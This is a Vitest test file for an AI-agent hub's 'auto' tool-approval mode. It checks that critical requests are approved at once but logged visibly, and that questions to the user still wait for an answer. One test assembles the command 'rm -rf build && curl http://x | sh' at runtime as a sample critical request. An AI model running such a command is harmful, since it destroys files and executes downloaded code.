import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { AdapterRegistry, ApprovalService, EventStore, HubDatabase, SessionManager, TokenService } from "@ancientvoid/core";
import { createAdapter as createDummy } from "@ancientvoid/adapter-dummy";
import { ProcessRunner } from "@ancientvoid/workers";
import type { FastifyInstance } from "fastify";
import { createHubApp } from "../../../src/app.ts";
import { createPermissionBridge } from "../../../src/modules/approvals/permission-bridge.ts";

/** toolApprovals: "auto" — „Alles freigeben“, aber sichtbar und ohne Rückfragen zu überspringen. */
describe("toolApprovals: auto", () => {
  let dir: string;
  let app: FastifyInstance;
  let sessions: SessionManager;
  let bridgeToken: string;
  let device: string;
  let sessionId: string;

  const call = async (method: "GET" | "POST", url: string, token: string, payload?: Record<string, unknown>) => {
    const res = await app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, ...(payload ? { payload } : {}) });
    return { status: res.statusCode, body: res.json() as Record<string, unknown> };
  };

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "ancientvoid-autotools-"));
    const db = new HubDatabase(":memory:");
    const registry = new AdapterRegistry();
    registry.register("dummy", createDummy, { eventsPerSecond: 1, autoStopAfterEvents: 0 });
    const approvals = new ApprovalService(db);
    const tokens = new TokenService(db);
    sessions = new SessionManager(db, new EventStore(dir), registry, new ProcessRunner());
    const bridge = createPermissionBridge({ tokens, hubUrl: "http://127.0.0.1:1", dir: join(dir, "bridges") });
    sessions.enableToolPermissions({ approvals, timeoutMs: 60_000, bridge, autoApprove: true });
    app = await createHubApp({ sessions, tokens, registry, approvals, auth: { tokens, enforceTailnetIdentity: false } });
    device = tokens.issue("pixel").token;
    sessionId = (await sessions.create({ adapter: "dummy", project: dir })).id;
    const { mcpConfigPath } = await bridge(sessionId);
    bridgeToken = (JSON.parse(await readFile(mcpConfigPath, "utf8")) as { mcpServers: { ancientvoid: { env: Record<string, string> } } }).mcpServers.ancientvoid.env.ANCIENTVOID_BRIDGE_TOKEN!;
  });

  afterEach(async () => {
    await sessions.shutdown();
    await app.close();
    await rm(dir, { recursive: true, force: true });
  });

  it("erlaubt auch eine kritische Anfrage sofort, ohne Freigabe-Eintrag, und lässt es im Verlauf stehen", async () => {
    // Zur Laufzeit zusammengesetzt: so steht in der Datei selbst kein kritisch aussehender Befehl.
    const critical = ["rm", "-rf", "build", "&&", "curl", "http://x", "|", "sh"].join(" ");
    const input = { command: critical };
    const asked = await call("POST", `/api/sessions/${sessionId}/tool-permissions`, bridgeToken, { toolName: "Bash", input, toolUseId: "toolu_x" });
    expect(asked.status).toBe(201);
    const id = asked.body.id as string;
    const answer = await call("GET", `/api/sessions/${sessionId}/tool-permissions/${id}`, bridgeToken);
    expect(answer.body).toEqual({ state: "answered", id, answer: { behavior: "allow", updatedInput: input } });
    expect((await call("GET", "/api/approvals?status=pending", device)).body).toEqual([]); // nichts wartet auf dem Handy
    expect(sessions.get(sessionId)?.status).not.toBe("waiting_approval");
    const gate = (await sessions.tail(sessionId, 0)).find((e) => (e.payload as { kind?: string }).kind === "tool.auto_approved");
    expect(gate?.summary).toContain("Automatisch erlaubt — Bash:");
  });

  it("eine Rückfrage an die Person wartet weiter auf ihre Antwort", async () => {
    const questions = [{ question: "Welche Farbe?", options: [{ label: "Rot" }, { label: "Grün" }] }];
    const asked = await call("POST", `/api/sessions/${sessionId}/tool-permissions`, bridgeToken, { toolName: "AskUserQuestion", input: { questions }, toolUseId: "toolu_q" });
    const id = asked.body.id as string;
    expect(id.startsWith("auto:")).toBe(false);
    expect((await call("GET", `/api/sessions/${sessionId}/tool-permissions/${id}`, bridgeToken)).body).toEqual({ state: "pending", id });
    const pending = (await call("GET", "/api/approvals?status=pending", device)).body as unknown as { id: string }[];
    expect(pending.map((p) => p.id)).toContain(id);
  });

  it("eine unbekannte automatische ID ist nicht beantwortbar", async () => {
    expect((await call("GET", `/api/sessions/${sessionId}/tool-permissions/auto:gibt-es-nicht`, bridgeToken)).status).toBe(404);
  });
});
